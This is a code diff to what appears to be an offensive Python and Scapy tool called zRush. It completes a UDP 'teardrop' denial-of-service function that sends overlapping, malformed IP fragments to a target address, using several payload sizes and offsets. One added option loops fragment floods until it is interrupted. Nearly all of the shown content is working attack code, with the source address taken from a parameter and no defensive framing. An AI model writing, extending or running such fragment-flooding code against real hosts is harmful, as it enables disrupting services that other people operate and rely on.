@@ -94,9 +94,10 @@ def UDPteardrop(src, dst, dport):
     print("[*] Select attack options from below:")
     print("    1. small payload (36 bytes), 2 packets, offset = 3x8 bytes")
     print("    2. large payload (1300 bytes), 2 packets, offset = 80x8 bytes")
-    print("    3. large payload (1300 bytes), 2 packets, offset = 80x8 bytes")
+    print("    3. large payload (1300 bytes), 12 packets, offset = 80x8 bytes")
     print("    4. large payload (1300 bytes), 2 packets, offset = 3x8 bytes")
     print("    5. large payload (1300 bytes), 2 packets, offset = 10x8 bytes")
+    print("    6. large payload (1300 bytes), looped packets (ctrl-c to send end packet), offset = 10x8 bytes")
     x = input("zRush > ")
     print("Using attack",x)
     match x:
@@ -104,19 +105,79 @@ def UDPteardrop(src, dst, dport):
             size = 36
             offset = 3
             load1 = "\x00"*size
-            ip = IP(src = src, dst = dst, flags = "MF", proto = 17)
+            ip1 = IP(src = src, dst = dst, flags = "MF", proto = 17)
 
             size = 4
             offset = 18
             load2 = "x00"*size
 
-            ip2 = IP(src = src, dst = dst, flags = "MF", proto = 17 frag = offset)
+            ip2 = IP(src = src, dst = dst, flags = 0, proto = 17, frag = offset)
             
             send(ip1/load1)
             send(ip2/load2)
         case "2":
-            print("*")
+            size = 1300
+            offset = 80
+            load1 = "A"*size
+            ip1 = IP(src = src, dst = dst, flags = "MF", proto = 17)
+
+            ip2 = IP(src = src, dst = dst, flags = 0, proto = 17, frag = offset)
+
+            send(ip1/load1)
+            send(ip2/load1)
+
         case "3":
-            print("*")
+            size = 1300
+            offset = 80
+            load1 = "A"*size
+            ip = IP(src = src, dst = dst, flags = "MF", proto = 17, frag = 0)
+
+            send(ip/load1)
+            for i in range(1, 10):
+                ip.frag = offset
+                offset = offset + 80
+                send(ip/load1)
+            ip.frag = offset
+            ip.flags = 0
+            send(ip/load1)
         case "4":
-            print("*")
+            size = 1300
+            offset = 3
+            load1 = "\x00"*size
+            ip1 = IP(src = src, dst = dst, flags = "MF", proto = 17)
+
+            size = 4
+            offset = 18
+            load2 = "x00"*size
+
+            ip2 = IP(src = src, dst = dst, flags = 0, proto = 17, frag = offset)
+            
+            send(ip1/load1)
+            send(ip2/load2)
+        case "5":
+            size = 1300
+            offset = 10
+            load = "A"*size
+
+            ip = IP(src = src, dst = dst, flags = "MF", proto = 17)
+
+            ip2 = IP(src = src, dst = dst, flags = 0, proto = 17, frag = offset)
+
+            send(ip/load)
+            send(ip2/load)
+        case "6":
+            size = 1300
+            offset = 80
+            load1 = "A"*size
+            ip = IP(src = src, dst = dst, flags = "MF", proto = 17, frag = 0)
+
+            send(ip/load1)
+            try:
+                while(True):
+                    ip.frag = offset
+                    offset = offset + 80
+                    send(ip/load1)
+            except KeyboardInterrupt:
+                ip.frag = offset
+                ip.flags = 0
+                send(ip/load1)
